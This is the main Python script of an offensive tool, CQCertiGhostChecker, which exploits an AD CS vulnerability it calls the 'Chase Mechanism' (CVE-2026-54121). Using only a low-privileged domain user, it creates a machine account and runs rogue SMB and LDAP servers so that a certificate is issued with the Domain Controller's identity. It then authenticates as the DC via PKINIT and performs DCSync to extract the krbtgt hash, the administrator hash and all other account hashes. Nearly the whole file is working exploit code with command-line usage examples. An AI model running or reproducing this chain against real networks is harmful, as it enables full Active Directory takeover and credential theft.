#!/usr/bin/env python3
"""
CQCertiGhostChecker -- CVE-2026-54121 ADCS Chase Mechanism Abuse

Professional pentesting tool that exploits the AD CS Chase Mechanism
vulnerability to impersonate a Domain Controller using a low-privileged
domain user account, then performs DCSync to extract credential material.

Attack chain:
    1. AD Discovery (CA, DC, SID, GUID)
    2. Machine account creation
    3. Certificate enrollment via Chase Mechanism (CDC/RMD)
    4. Kerberos authentication as DC (PKINIT)
    5. DCSync

Usage:
    CQCertiGhostChecker.py attack -d cqure.lab -u bob -p 'P@ssw0rd' --dc-ip 10.10.10.10
    CQCertiGhostChecker.py check
"""

import argparse
import asyncio
import getpass
import logging
import os
import sys
import time

from config import CertiConfig
from ui import (
    print_banner,
    check_dependencies,
    print_step,
    print_success,
    print_fail,
    print_info,
    print_warning,
    print_config,
    print_summary,
    setup_logging,
)

VERSION = "2.1.0"
TOOL_NAME = "CQCertiGhostChecker"
CVE_ID = "CVE-2026-54121"

logger = logging.getLogger("certighost")


def parse_args(argv=None):
    """Parse CLI arguments and return the namespace."""
    parser = argparse.ArgumentParser(
        prog=TOOL_NAME,
        description=f"{TOOL_NAME} -- {CVE_ID} ADCS Chase Mechanism Abuse",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  # Full attack (use venv python under sudo)
  sudo venv/bin/python3 {TOOL_NAME}.py attack -d cqure.lab -u bob -p 'P@ssw0rd' --dc-ip 10.10.10.10

  # Auto-prompt for password
  sudo venv/bin/python3 {TOOL_NAME}.py attack -d cqure.lab -u bob --dc-ip 10.10.10.10

  # Dependency check only (no root needed)
  python3 {TOOL_NAME}.py check

  # Dry run (show config, don't execute)
  sudo venv/bin/python3 {TOOL_NAME}.py attack -d cqure.lab -u bob -p pass --dc-ip 10.10.10.10 --dry-run

Note: sudo does not inherit the active virtualenv. Always use
      sudo venv/bin/python3 instead of sudo python3.
""",
    )

    parser.add_argument(
        "--version",
        action="version",
        version=f"{TOOL_NAME} {VERSION} ({CVE_ID})",
    )

    # Shared flags available on all subcommands
    shared = argparse.ArgumentParser(add_help=False)
    shared.add_argument(
        "--no-color",
        action="store_true",
        default=False,
        help="Disable ANSI color output",
    )
    shared.add_argument(
        "-q", "--quiet",
        action="store_true",
        default=False,
        help="Suppress banner and progress, show only results and errors",
    )
    shared.add_argument(
        "--log",
        metavar="FILE",
        default=None,
        help="Log to file (no ANSI codes in file output)",
    )

    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    # --- attack subparser ---
    attack_parser = subparsers.add_parser(
        "attack",
        parents=[shared],
        help="Run the full exploit chain",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    attack_parser.add_argument(
        "-d", "--domain",
        required=True,
        help="Target AD domain name (e.g. cqure.lab)",
    )
    attack_parser.add_argument(
        "-u", "--username",
        required=True,
        help="Low-privileged domain username",
    )
    attack_parser.add_argument(
        "-p", "--password",
        default=None,
        help="User password (if omitted, will prompt interactively)",
    )
    attack_parser.add_argument(
        "--dc-ip",
        required=True,
        help="IP address of the Domain Controller",
    )
    attack_parser.add_argument(
        "--ca-name",
        default=None,
        help="CA name (auto-discovered if omitted)",
    )
    attack_parser.add_argument(
        "--ca-ip",
        default=None,
        help="IP of the CA server (auto-resolved from AD; falls back to --dc-ip)",
    )
    attack_parser.add_argument(
        "--target-dc",
        default=None,
        help="Target DC to impersonate (auto-discovered if omitted)",
    )
    attack_parser.add_argument(
        "--machine-account",
        default="ATTACKER$",
        help="Machine account name (default: ATTACKER$)",
    )
    attack_parser.add_argument(
        "--template",
        default="Machine",
        help="Certificate template name (default: Machine)",
    )
    attack_parser.add_argument(
        "--rogue-port",
        type=int,
        default=389,
        help="Port for rogue LDAP server (default: 389)",
    )
    attack_parser.add_argument(
        "--output",
        default="dc.ccache",
        help="Output credential cache file (default: dc.ccache)",
    )
    attack_parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        default=False,
        help="Enable verbose/debug logging",
    )
    attack_parser.add_argument(
        "--dry-run",
        action="store_true",
        default=False,
        help="Show configuration without executing the attack",
    )
    attack_parser.add_argument(
        "--no-cleanup",
        action="store_true",
        default=False,
        help="Skip cleanup on failure (keep machine account, PFX, etc.)",
    )

    # --- check subparser ---
    subparsers.add_parser(
        "check",
        parents=[shared],
        help="Check tool dependencies only",
    )

    args = parser.parse_args(argv)

    if args.command is None:
        parser.print_help(sys.stderr)
        sys.exit(2)

    return args


def _detect_no_color(args):
    """Determine whether color output should be disabled."""
    if args.no_color:
        return True
    if os.environ.get("NO_COLOR", "") != "":
        return True
    if not sys.stderr.isatty():
        return True
    return False


def _build_config(args):
    """Build CertiConfig from parsed attack arguments."""
    password = args.password
    if password is None:
        password = getpass.getpass(f"Password for {args.username}@{args.domain}: ")

    return CertiConfig(
        domain=args.domain,
        username=args.username,
        password=password,
        dc_ip=args.dc_ip,
        ca_name=args.ca_name,
        target_dc=args.target_dc,
        machine_account_name=args.machine_account,
        ca_ip=args.ca_ip,
        template=args.template,
        output_file=args.output,
        verbose=args.verbose,
        dry_run=args.dry_run,
        ldap_port=args.rogue_port,
    )


def _get_attacker_ip(dc_ip: str) -> str:
    """Determine the attacker's IP that the CA can reach (source IP toward DC)."""
    import socket as _socket
    try:
        s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
        s.connect((dc_ip, 389))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "0.0.0.0"


def _cleanup(config, machine_created, pfx_path, dc_fqdn=None, failure=True):
    """Clean up resources created during the attack."""
    if failure:
        print_warning("Cleaning up after failure...")
    else:
        print_info("Cleaning up resources...")

    if machine_created:
        try:
            import subprocess as _sp
            cmd = [
                "impacket-addcomputer",
                f"{config.domain}/{config.username}:{config.password}",
                "-method", "SAMR",
                "-computer-name", config.machine_account_name.rstrip("$"),
                "-dc-ip", config.dc_ip,
                "-delete",
            ]
            _sp.run(cmd, capture_output=True, text=True, timeout=15)
            print_info(f"Deleted machine account: {config.machine_account_name}")
        except Exception as e:
            print_fail(f"Failed to delete machine account: {e}")

    if pfx_path and os.path.isfile(pfx_path):
        try:
            os.remove(pfx_path)
            print_info(f"Removed PFX file: {pfx_path}")
        except OSError as e:
            print_fail(f"Failed to remove PFX file: {e}")

    if dc_fqdn:
        try:
            from dns_utils import remove_hosts_entry
            remove_hosts_entry(dc_fqdn)
        except Exception:
            pass


async def run_attack(config, args):
    """Execute the full 5-step attack chain with cleanup on failure."""
    machine_created = False
    pfx_path = None
    dc_fqdn = None
    step_times = []
    graceful = False
    total_start = time.monotonic()

    try:
        # ==================================================
        # STEP 1: AD Discovery
        # ==================================================
        print_step(1, 5, "AD Discovery")
        step_start = time.monotonic()

        from discovery import discover_ad

        ad_info = await discover_ad(
            config.domain, config.username, config.password, config.dc_ip
        )

        ca_name = config.ca_name or ad_info["ca"].get("name")
        if not ca_name:
            raise RuntimeError("CA name not provided and auto-discovery failed")

        if not config.ca_ip and ad_info["ca"].get("dns_hostname"):
            ca_host = ad_info["ca"]["dns_hostname"]
            import socket as _sock
            try:
                resolved = _sock.gethostbyname(ca_host)
                config.ca_ip = resolved
                logger.info(f"CA IP auto-resolved: {ca_host} -> {resolved}")
            except _sock.gaierror:
                logger.warning(
                    f"Cannot resolve CA hostname '{ca_host}'. "
                    f"Falling back to DC IP ({config.dc_ip}). "
                    f"Use --ca-ip if the CA is on a different server."
                )

        elapsed = time.monotonic() - step_start
        step_times.append(("AD Discovery", elapsed))
        print_success(f"DC: {ad_info['dc'].get('dns_hostname', 'unknown')}")
        print_success(f"CA: {ca_name}")
        if config.ca_ip and config.ca_ip != config.dc_ip:
            print_success(f"CA IP: {config.ca_ip} (auto-discovered)")
        print_success(f"Domain SID: {ad_info.get('domain_sid', 'unknown')}")
        print_success(f"Step 1 completed in {elapsed:.1f}s")

        # ==================================================
        # DNS: Ensure DC FQDN resolves before Kerberos/DCSync
        # ==================================================
        dc_fqdn = config.target_dc or ad_info["dc"].get("dns_hostname")
        if dc_fqdn:
            print_info(f"Ensuring DNS resolution for {dc_fqdn} -> {config.dc_ip}")
            from dns_utils import ensure_dc_resolves

            ensure_dc_resolves(dc_fqdn, config.dc_ip)

        # ==================================================
        # STEP 2: Create machine account
        # ==================================================
        print_step(2, 5, "Creating Machine Account")
        step_start = time.monotonic()

        from machine_account import create_machine_account

        machine = await create_machine_account(
            config.domain,
            config.username,
            config.password,
            config.dc_ip,
            config.machine_account_name,
            config.machine_account_ou,
        )
        machine_created = True

        elapsed = time.monotonic() - step_start
        step_times.append(("Machine Account", elapsed))
        print_success(f"Machine created: {machine['dn']}")
        print_success(f"Machine SID: {machine['sid']}")
        print_success(f"Step 2 completed in {elapsed:.1f}s")

        # ==================================================
        # STEP 3: Certificate enrollment (Chase Mechanism)
        # ==================================================
        dc_hostname = ad_info["dc"].get("dns_hostname", f"DC01.{config.domain}")

        print_step(3, 5, "Certificate Enrollment (Chase Mechanism)")
        step_start = time.monotonic()

        from services import ServiceManager
        from machine_account import configure_chase_redirect
        from certificate import enroll_certificate_chase
        from Crypto.Hash import MD4

        if os.geteuid() != 0:
            raise RuntimeError(
                "Chase mechanism requires root (ports 445+389). "
                "Run with sudo or as root."
            )

        attacker_ip = _get_attacker_ip(config.dc_ip)
        if attacker_ip == "0.0.0.0":
            raise RuntimeError(
                "Cannot determine attacker IP (no route to DC). "
                "Check network connectivity to " + config.dc_ip
            )
        attacker_fqdn = f"{config.machine_account_name.rstrip('$').lower()}.{config.domain}"

        machine_password = machine["password"]
        machine_hash = MD4.new(machine_password.encode("utf-16-le")).hexdigest()
        print_info(f"Machine account NT hash computed")

        domain_netbios = config.domain.split(".")[0].upper()
        domain_guid_hex = ad_info.get("domain_guid", "00" * 16).replace("-", "")
        domain_sid = ad_info.get("domain_sid", "S-1-5-21-0-0-0")
        target_sid_bin = ad_info["dc"].get("sid_bin", b"\x00" * 28)
        target_dns = dc_hostname
        target_cn = dc_hostname.split(".")[0]
        target_sam = target_cn + "$"

        print_info(f"Starting rogue servers: SMB:445 + LDAP:{config.ldap_port}")
        svc_manager = ServiceManager(
            domain_dns=config.domain,
            domain_netbios=domain_netbios,
            domain_sid=domain_sid,
            domain_guid_hex=domain_guid_hex,
            computer_name=config.machine_account_name,
            computer_hash=machine_hash,
            computer_password=machine_password,
            dc_ip=config.dc_ip,
            target_sid_bin=target_sid_bin,
            target_dns=target_dns,
            target_cn=target_cn,
            target_sam=target_sam,
            ldap_port=config.ldap_port,
        )
        svc_manager.start()
        time.sleep(2)

        try:
            print_info(f"Configuring chase redirect: dNSHostName -> {attacker_fqdn}")
            redirect_ok = await configure_chase_redirect(
                domain=config.domain,
                username=config.username,
                password=config.password,
                dc_ip=config.dc_ip,
                machine_name=config.machine_account_name,
                attacker_hostname=attacker_fqdn,
            )
            if redirect_ok:
                print_success(f"dNSHostName set to {attacker_fqdn}")
            else:
                print_warning("dNSHostName modify failed — relying on CDC in attributes")

            print_info(f"Submitting CSR: CDC={attacker_ip} RMD={dc_hostname}")
            cert_info = await enroll_certificate_chase(
                domain=config.domain,
                username=config.username,
                password=config.password,
                dc_ip=config.dc_ip,
                ca_name=ca_name,
                cdc_ip=attacker_ip,
                rmd_hostname=dc_hostname,
                machine_name=config.machine_account_name,
                machine_hash=machine_hash,
                template=config.template,
                ca_ip=config.ca_ip,
                out_dir=".",
            )

            if svc_manager.chase_received:
                print_success("Chase lookup received and served by rogue LDAP")
            elif not svc_manager.wait_for_chase(timeout=2):
                print_info("No chase lookup received (CA processed request without redirect)")

        finally:
            svc_manager.stop()

        private_key = cert_info["private_key"]
        pfx_path = cert_info.get("pfx_path")

        elapsed = time.monotonic() - step_start
        step_times.append(("Certificate Enrollment", elapsed))
        print_success(f"Subject: {cert_info.get('subject', 'unknown')}")
        print_success(f"DNS: {cert_info.get('dns', 'unknown')}")
        print_success(f"PFX: {cert_info.get('pfx_path', 'unknown')}")
        print_success(f"Step 3 completed in {elapsed:.1f}s")

        # Check if chase mechanism redirected identity to DC
        cert_dns = cert_info.get("dns", "")
        if dc_hostname and cert_dns.lower() != dc_hostname.lower():
            print_warning(
                f"Certificate has requestor identity ({cert_dns}), "
                f"not target DC ({dc_hostname})"
            )
            print_warning(
                "Chase mechanism not triggered — CA is not vulnerable to CVE-2026-54121"
            )
            print_info(
                "On a vulnerable CA, the certificate would contain DC identity "
                "and Steps 4-5 would complete the privilege escalation"
            )
            print_success(f"Proof-of-concept complete (Steps 1-3 operational)")
            graceful = True
            return 0

        # ==================================================
        # STEP 4: Kerberos authentication (PKINIT)
        # ==================================================
        print_step(4, 5, "Kerberos Authentication (PKINIT)")
        step_start = time.monotonic()

        from kerberos_auth import authenticate_as_dc

        ccache = await authenticate_as_dc(
            cert_info=cert_info,
            private_key=private_key,
            domain=config.domain,
            dc_ip=config.dc_ip,
            target_dc=config.target_dc or ad_info["dc"].get("dns_hostname"),
            output_file=config.output_file,
        )

        elapsed = time.monotonic() - step_start
        step_times.append(("Kerberos Auth", elapsed))
        print_success(f"TGT saved to {config.output_file}")
        print_success(f"Step 4 completed in {elapsed:.1f}s")

        # ==================================================
        # STEP 5: DCSync
        # ==================================================
        print_step(5, 5, "DCSync")
        step_start = time.monotonic()

        from dcsync import run_dcsync

        dc_principal = ccache.get("principal", cert_info.get("dns", "DC01$"))
        dcsync_result = await run_dcsync(
            domain=config.domain,
            dc_ip=config.dc_ip,
            username=dc_principal,
            ccache_file=config.output_file,
            target_dc=config.target_dc or ad_info["dc"].get("dns_hostname"),
            nt_hash=ccache.get("nt_hash"),
        )

        elapsed = time.monotonic() - step_start
        step_times.append(("DCSync", elapsed))
        print_success(f"DCSync complete")
        print_success(f"krbtgt hash: {dcsync_result.get('krbtgt_hash', 'unknown')}")
        print_success(f"Step 5 completed in {elapsed:.1f}s")

        graceful = True

    finally:
        if not args.no_cleanup and (machine_created or pfx_path):
            _cleanup(config, machine_created, pfx_path, dc_fqdn=dc_fqdn,
                     failure=not graceful)

    # ==================================================
    # Summary
    # ==================================================
    total_elapsed = time.monotonic() - total_start
    print_success(f"Attack completed in {total_elapsed:.1f}s")

    print_summary({
        "ccache": config.output_file,
        "dc": cert_info.get("dns"),
        "krbtgt": dcsync_result.get("krbtgt_hash"),
        "administrator": dcsync_result.get("administrator_hash"),
        "total_accounts": len(dcsync_result.get("all_hashes", {})),
        "elapsed": f"{total_elapsed:.1f}s",
    })

    return 0


async def run_check(args):
    """Run dependency check only."""
    if not args.quiet:
        print_banner()

    ok = check_dependencies(mode="attack")
    if ok:
        print_success("All dependencies satisfied.")
        return 0
    else:
        print_fail("Some dependencies are missing. Install them before running the attack.")
        return 3


async def main(argv=None):
    """Main entry point -- parse args, dispatch to attack or check."""
    args = parse_args(argv)

    verbose = getattr(args, "verbose", False)
    no_color = _detect_no_color(args)
    setup_logging(verbose=verbose, no_color=no_color, log_file=args.log)

    if args.command == "check":
        return await run_check(args)

    if args.command == "attack":
        if not args.quiet:
            print_banner()

        # Dependency gate
        if not check_dependencies(mode="attack"):
            print_fail("Missing dependencies. Run 'check' for details.")
            return 3

        config = _build_config(args)

        if not args.quiet:
            print_config(config)

        if config.dry_run:
            print_info("Dry run mode -- configuration displayed, not executing.")
            return 0

        return await run_attack(config, args)

    # Should not reach here (parse_args exits on missing command)
    return 2


if __name__ == "__main__":
    exit_code = 1
    try:
        exit_code = asyncio.run(main()) or 0
    except KeyboardInterrupt:
        print_fail("Interrupted by user.")
        exit_code = 4
    except SystemExit as e:
        exit_code = e.code if isinstance(e.code, int) else 1
    except Exception as e:
        verbose = logging.getLogger().level <= logging.DEBUG
        logger.error(f"Fatal error: {e}", exc_info=verbose)
        print_fail(f"Attack failed: {e}")
        if not verbose:
            print_info("Run with -v for full traceback.")
        exit_code = 1
    sys.exit(exit_code)
